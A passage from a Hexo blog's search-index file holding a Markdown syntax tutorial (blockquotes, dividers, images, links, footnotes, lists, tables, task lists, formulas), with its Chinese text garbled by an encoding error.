ä½œè€…ï¼šAimerl0</span><br></pre></td></tr></table></figure><blockquote><p>ä½œè€…ï¼šC1everF0x</p><p>â€”â€”å¤ªé˜³ä¸æ˜¯ä¸€ä¸‹å­å°±ä¸‹å±±çš„</p><blockquote><p>ä½œè€…ï¼šOui0jr</p><p>â€”â€”ä½ç½®ç©ºäº†æ€»ä¼šæœ‰äººå»åçš„</p><blockquote><p>ä½œè€…ï¼šAimerl0</p><p>â€”â€”æˆ‘é‚£ä¹ˆå¤šé—æ†¾é‚£ä¹ˆå¤šæœŸç›¼ä½ çŸ¥é“å—</p></blockquote></blockquote></blockquote><h2 id="5-åˆ†å‰²çº¿ï¼š"><a href="#5-åˆ†å‰²çº¿ï¼š" class="headerlink" title="5.åˆ†å‰²çº¿ï¼š"></a>5.åˆ†å‰²çº¿ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// åˆ†å‰²çº¿</span><br><span class="line">---</span><br><span class="line">// åˆ†å‰²çº¿2</span><br><span class="line">***</span><br><span class="line">å…¶å®éƒ½ä¸€æ ·</span><br></pre></td></tr></table></figure><hr><hr><h2 id="6-å›¾ç‰‡æ’å…¥"><a href="#6-å›¾ç‰‡æ’å…¥" class="headerlink" title="6.å›¾ç‰‡æ’å…¥"></a>6.å›¾ç‰‡æ’å…¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// åœ¨çº¿å›¾ç‰‡/æœ¬åœ°å›¾ç‰‡</span><br><span class="line">![ç…§ç‰‡åå­—](å›¾ç‰‡è·¯å¾„)</span><br><span class="line">// æ„Ÿå¹å·è‹±æ–‡</span><br></pre></td></tr></table></figure><p><img src="D:\hexo\cat.png" alt="çŒ«çŒ«"></p><h2 id="7-è¶…é“¾æ¥"><a href="#7-è¶…é“¾æ¥" class="headerlink" title="7.è¶…é“¾æ¥"></a>7.è¶…é“¾æ¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// è¶…é“¾æ¥è¯­æ³•</span><br><span class="line">[è¶…é“¾æ¥å†…å®¹åå­—](è·¯å¾„)</span><br><span class="line">// æ³¨è„šè¯­æ³•</span><br><span class="line">[^æ³¨è„šåå­—]ï¼Œç„¶ååœ¨æ–‡æœ¬ç»“å°¾æ·»åŠ è„šæ³¨ï¼Œéœ€è¦å‰åå¯¹åº”åå­—</span><br><span class="line">// è‡ªåŠ¨é“¾æ¥è¯­æ³•</span><br><span class="line">&lt;é“¾æ¥&gt;</span><br></pre></td></tr></table></figure><p><a href="https://c1everf0x.github.io/">C1everF0xâ€™s Blog</a></p><p>ä½¿ç”¨Markdown<a href="Markdown%E6%98%AF%E4%B8%80%E7%A7%8D%E7%BA%AF%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">^1</a>å¯ä»¥æ•ˆç‡çš„ä¹¦å†™æ–‡æ¡£ã€ç¬”è®°ï¼Œç›´æ¥è½¬æ¢æˆHTML[^2]</p><p><a href="https://c1everf0x.github.io/">https://C1everF0x.github.io</a></p><h2 id="8-åˆ—è¡¨"><a href="#8-åˆ—è¡¨" class="headerlink" title="8.åˆ—è¡¨"></a>8.åˆ—è¡¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// æ— åºåˆ—è¡¨</span><br><span class="line">- ç›®å½•1</span><br><span class="line">- ç›®å½•2</span><br><span class="line">- ç›®å½•3</span><br><span class="line">// æœ‰åºåˆ—è¡¨</span><br><span class="line">1. åç§°</span><br></pre></td></tr></table></figure><ul><li>ç›®å½•1<ul><li>ç›®å½•2<ul><li>ç›®å½•3<ul><li>ç›®å½•4</li></ul></li></ul></li></ul></li></ul><ol><li>åç§°</li><li>é¦–é¡µ</li><li>åˆ†ç±»</li></ol><h2 id="9-è¡¨æ ¼"><a href="#9-è¡¨æ ¼" class="headerlink" title="9.è¡¨æ ¼"></a>9.è¡¨æ ¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// è¡¨æ ¼è¯­æ³•</span><br><span class="line">é¼ æ ‡å³é”®-&gt;æ’å…¥â€”&gt;è¡¨æ ¼</span><br></pre></td></tr></table></figure><table><thead><tr><th>ID</th><th>C1everF0x</th></tr></thead><tbody><tr><td>çº§åˆ«</td><td>åºŸç‰©</td></tr></tbody></table><h2 id="10-ä»»åŠ¡åˆ—è¡¨"><a href="#10-ä»»åŠ¡åˆ—è¡¨" class="headerlink" title="10.ä»»åŠ¡åˆ—è¡¨"></a>10.ä»»åŠ¡åˆ—è¡¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- [ ] ä»»åŠ¡ä¸€ æœªåšä»»åŠ¡ `- + ç©ºæ ¼ + [ ]`</span><br><span class="line">- [x] ä»»åŠ¡äºŒ å·²åšä»»åŠ¡ `- + ç©ºæ ¼ + [x]`</span><br></pre></td></tr></table></figure><ul><li><input disabled="" type="checkbox"> ä»»åŠ¡ä¸€ æœªåšä»»åŠ¡</li><li><input checked="" disabled="" type="checkbox"> ä»»åŠ¡äºŒ å·²åšä»»åŠ¡</li></ul><h2 id="11-å…¬å¼"><a href="#11-å…¬å¼" class="headerlink" title="11.å…¬å¼"></a>11.å…¬å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// å…¬å¼è¯­æ³•</span><br><span class="line">å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªç¾å…ƒç¬¦ $$ åŒ…è£¹ TeX æˆ– LaTeX æ ¼å¼çš„æ•°å­¦å…¬å¼</span><br><span class="line">$$E = mc^2$$</span><br></pre></td></tr></table></figure><p>$$<br>E &#x3D; mc^2<br>$$</p><p>[^2]:HyperText Markup Language è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
